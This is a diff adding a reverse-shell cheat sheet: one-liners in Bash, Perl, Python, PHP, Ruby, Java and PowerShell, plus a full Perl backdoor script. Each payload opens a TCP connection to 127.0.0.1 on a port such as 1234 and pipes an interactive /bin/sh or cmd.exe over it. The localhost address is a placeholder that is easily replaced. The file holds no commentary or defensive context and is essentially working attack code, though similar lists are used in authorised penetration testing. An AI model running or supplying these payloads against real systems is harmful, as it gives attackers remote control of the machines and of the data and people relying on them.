@@ -1,0 +1,73 @@
+exec /bin/bash 0&0 2>&0
+
+########
+# Bash #
+########
+bash -i >& /dev/tcp/127.0.0.1/1234 0>&1
+
+
+
+########
+# Perl #
+########
+perl -e 'use Socket;$i="127.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+
+
+cat perlbackdoor.pl
+#!/usr/bin/perl
+use Socket;
+use FileHandle;
+$IP = $ARGV[0];
+$PORT = $ARGV[1];
+socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
+connect(SOCKET, sockaddr_in($PORT,inet_aton($IP)));
+SOCKET->autoflush();
+open(STDIN, ">&SOCKET");
+open(STDOUT,">&SOCKET");
+open(STDERR,">&SOCKET");
+system("/bin/sh -i");
+
+
+##########
+# Python #
+##########
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+#######
+# Php #
+#######
+php -r '$sock=fsockopen("127.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+
+########
+# ruby #
+########
+ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+
+
+########
+# Java #
+########
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/127.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+
+exec 5<>/dev/tcp/127.0.0.1/1234
+
+
+cat <&5 | while read line; do $line 2>&5 >&5; done
+
+exec 5<>/dev/tcp/127.0.0.1/1234
+
+while read line 0<&5; do $line 2>&5 >&5; done
+0<&196;exec 196<>/dev/tcp/127.0.0.1/1234; sh <&196 >&196 2>&196
+
+
+##############
+# Powershell #
+##############
+powershell -command "function ReverseShellClean {if ($client.Connected -eq $true) {$client.Close()};  if ($process.ExitCode -ne $null) {$process.Close()};  exit;  };$address = '127.0.0.1';  $port = '1234';$client = New-Object system.net.sockets.tcpclient; $client.connect($address,$port) ;$stream = $client.GetStream();$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize  ;$process = New-Object System.Diagnostics.Process  ;$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'  ;$process.StartInfo.RedirectStandardInput = 1  ;$process.StartInfo.RedirectStandardOutput = 1;$process.StartInfo.UseShellExecute = 0  ;$process.Start()  ;$inputstream = $process.StandardInput  ;$outputstream = $process.StandardOutput  ;Start-Sleep 1  ;$encoding = new-object System.Text.AsciiEncoding  ;while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())};$stream.Write($encoding.GetBytes($out),0,$out.Length)  ;$out = $null; $done = $false; $testing = 0; ;while (-not $done) {if ($client.Connected -ne $true) {cleanup}  ;$pos = 0; $i = 1;  while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) { $read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos);  $pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}  ;if ($pos -gt 0){ $string = $encoding.GetString($networkbuffer,0,$pos);  $inputstream.write($string);  start-sleep 1;  if ($process.ExitCode -ne $null) {ReverseShellClean};else {  $out = $encoding.GetString($outputstream.Read()); while($outputstream.Peek() -ne -1){;  $out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}};  $stream.Write($encoding.GetBytes($out),0,$out.length);  $out = $null;  $string = $null}} else {ReverseShellClean}};"
